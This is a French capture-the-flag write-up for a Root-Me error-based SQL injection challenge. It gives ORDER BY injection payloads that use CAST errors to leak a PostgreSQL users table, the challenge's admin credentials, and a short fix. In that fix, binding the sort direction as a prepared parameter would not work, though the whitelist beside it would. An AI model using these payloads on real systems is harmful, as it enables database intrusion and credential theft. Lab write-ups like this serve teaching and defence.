# Challenge 7 : SQL Injection - Error Based

**URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error

## Exploitation

Parametre vulnerable: `order`

### Etape 1: Tester l'injection

URL de base:
```
/web-serveur/ch34/?action=contents&order=ASC
```

Test:
```
?action=contents&order=test
```

Erreur SQL revelee:
```
ERROR: syntax error at or near "test" LINE 1: ...out TO 100; COMMIT;SELECT * FROM contents order by page test
```

### Etape 2: Extraire les donnees

Payload pour reveler la structure:
```sql
(SELECT(SELECT%20chr(32)||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em4il_c0l||chr(32)FROM users LIMIT 1))
```

ou injection dans ORDER BY:
```sql
,(cast((SELECT us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em4il_c0l FROM users LIMIT 1) as int))
```

## Resultat

Erreur revelee avec les donnees:
```
ERROR: invalid input syntax for integer: "1 admin 1a2BdKT5Dlx3qxQN3UaC admin@localhost"
```

Credentials:
- Username: admin
- Password: 1a2BdKT5Dlx3qxQN3UaC
- Email: admin@localhost

## Explication

- Error-based SQL injection dans le parametre ORDER BY
- Les erreurs SQL revelent les donnees de la base
- CAST vers int force une erreur qui affiche le contenu
- PostgreSQL revele les donnees dans les messages d'erreur

## Correction

Utiliser prepared statements. Ne jamais afficher les erreurs SQL en production.
```php
$stmt = $pdo->prepare("SELECT * FROM contents ORDER BY page ?");
// Mieux: whitelist pour ORDER BY
$allowed = ['ASC', 'DESC'];
if (in_array($order, $allowed)) { ... }
```
